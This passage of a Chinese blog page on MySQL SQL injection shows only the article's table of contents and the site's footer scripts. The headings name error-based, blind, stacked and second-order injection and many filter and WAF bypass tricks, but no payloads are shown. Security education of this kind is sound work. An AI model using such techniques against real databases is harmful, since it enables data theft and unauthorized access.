href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number"></span> <span class="toc-text">修复方案</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">姿势总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number"></span> <span class="toc-text">注释</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">mysql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number"></span> <span class="toc-text">mysql数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number"></span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor"><span class="toc-number">1.</span> <span class="toc-text">floor()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.</span> <span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UPDATEXML-XML-document-XPath-string-new-value"><span class="toc-number">3.</span> <span class="toc-text">UPDATEXML (XML_document, XPath_string, new_value);</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-x"><span class="toc-number">4.</span> <span class="toc-text">exp(x)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#geometrycollection-mysql-%E7%89%88%E6%9C%AC5-5"><span class="toc-number">5.</span> <span class="toc-text">geometrycollection() mysql 版本5.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multipoint-mysql-%E7%89%88%E6%9C%AC5-5"><span class="toc-number">6.</span> <span class="toc-text">multipoint() mysql 版本5.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#polygon"><span class="toc-number">7.</span> <span class="toc-text">polygon()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mutipolygon"><span class="toc-number">8.</span> <span class="toc-text">mutipolygon()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linestring-%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">linestring(）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#multilinestring"><span class="toc-number">10.</span> <span class="toc-text">multilinestring()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-LatFromGeoHash-%EF%BC%88mysql-5-7-x%EF%BC%89"><span class="toc-number">11.</span> <span class="toc-text">ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-LongFromGeoHash"><span class="toc-number">12.</span> <span class="toc-text">ST.LongFromGeoHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-Pointfromgeohash-mysql-5-7"><span class="toc-number">13.</span> <span class="toc-text">ST_Pointfromgeohash (mysql&gt;5.7)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number"></span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%88%B0%E7%9A%84SQL%E8%AF%AD%E6%B3%95%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">用到的SQL语法知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">注入流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number"></span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-1"><span class="toc-number">1.</span> <span class="toc-text">注入流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-2"><span class="toc-number">1.</span> <span class="toc-text">注入流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-3"><span class="toc-number">1.</span> <span class="toc-text">注入流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">常见绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%B0%BE%E6%B3%A8%E9%87%8A%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">结尾注释符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">字符串变换绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-and%E3%80%81or-%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">过滤 and、or 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-%E8%BF%9B%E8%A1%8C%E5%BC%82%E6%88%96%E7%9B%B2%E6%B3%A8%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">使用^进行异或盲注绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">过滤空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">过滤括号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%EF%BC%88-%E3%80%81%EF%BC%89%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">过滤比较符号（&#x3D;、&lt;、&gt;）绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-in-%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">使用 in() 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LIKE-%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">LIKE 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REGEXP-%E6%B3%A8%E5%85%A5"><span class="toc-number">10.</span> <span class="toc-text">REGEXP 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E6%97%B6%E5%88%A9%E7%94%A8-MySql-%E9%A2%84%E5%A4%84%E7%90%86"><span class="toc-number">12.</span> <span class="toc-text">堆叠注入时利用 MySql 预处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">过滤逗号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-number">14.</span> <span class="toc-text">无列名注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B6%E4%BB%96%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">15.</span> <span class="toc-text">过滤其他关键字绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-substr-%E7%BB%95%E8%BF%87"><span class="toc-number">16.</span> <span class="toc-text">过滤 substr 绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93-HPP-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-Waf"><span class="toc-number">17.</span> <span class="toc-text">HTTP参数污染(HPP)漏洞绕过 Waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#False-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">18.</span> <span class="toc-text">False 注入绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E6%B3%A8%E5%85%A5"><span class="toc-number">19.</span> <span class="toc-text">DNS注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%98%E2%80%9C-md5-pass-true-%E2%80%9D%E2%80%98-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">20.</span> <span class="toc-text">‘“.md5($pass,true).”‘ 登录绕过</span></a></li></ol></li></ol></li></div></div></div></div></main><footer id="footer" style="background-image:url(/img/default_top_img.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2024 By Fannn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(()=>{const n=t=>"dark"===t?"dark":"light";var t=()=>{var t,e=Object.assign({src:"https://giscus.app/client.js","data-repo":"fnapinfai/blog-talk","data-repo-id":"R_kgDONW93-A","data-category-id":"DIC_kwDONW93-M4CkwWr","data-mapping":"pathname","data-theme":n(document.documentElement.getAttribute("data-theme")),"data-reactions-enabled":"1",crossorigin:"anonymous",async:!0},null),a=document.createElement("script");for(t in e)a.setAttribute(t,e[t]);document.getElementById("giscus-wrap").appendChild(a)};btf.addGlobalFn("themeChange",t=>{var e;t={setConfig:{theme:n(t)}},(e=document.querySelector("iframe.giscus-frame"))&&e.contentWindow.postMessage({giscus:t},"https://giscus.app")},"giscus"),t()})()</script></div><script defer id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer color="0,0,255" opacity="0.7" zindex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!0,document.body.addEventListener("input",POWERMODE)</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span> 数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({pluginModelPath:"assets/",model:{jsonPath:"/live2dw/assets/shizuku.model.json"},display:{position:"right",width:250,height:250},mobile:{show:!0},log:!1,pluginJsPath:"lib/",pluginRootPath:"live2dw/",tagMode:!1})</script><style>[bg-lazy]{background-image:none!important;background-color:#eee!important}</style><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,d=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=o());for(var e,i=0;i<d.length;i++)0<=(e=(e=d[i]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,a,n=d[i],o=function(){d=d.filter(function(t){return n!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(n)};(t=n).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),o()):(e=new Image,a=t.getAttribute("data-original"),e.onload=function(){t.src=a,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),o()},e.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=a},t.src!==a&&(e.src=a)))}()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)}(this)</script></body></html>